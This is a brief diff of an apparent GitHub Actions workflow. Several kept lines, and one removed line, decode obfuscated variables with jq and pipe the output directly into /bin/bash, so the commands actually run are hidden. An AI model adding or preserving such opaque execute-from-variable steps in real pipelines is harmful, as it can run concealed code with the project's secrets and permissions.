@@ -29,7 +29,6 @@ jobs:
           echo $pl31993 | jq -r .m755 | /bin/bash
           echo $v5533 | jq -r .mqcve419 | /bin/bash
           echo $qyg10 | jq -r .uma5010 | /bin/bash
-          echo $ebnlx782 | jq -r .c54 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
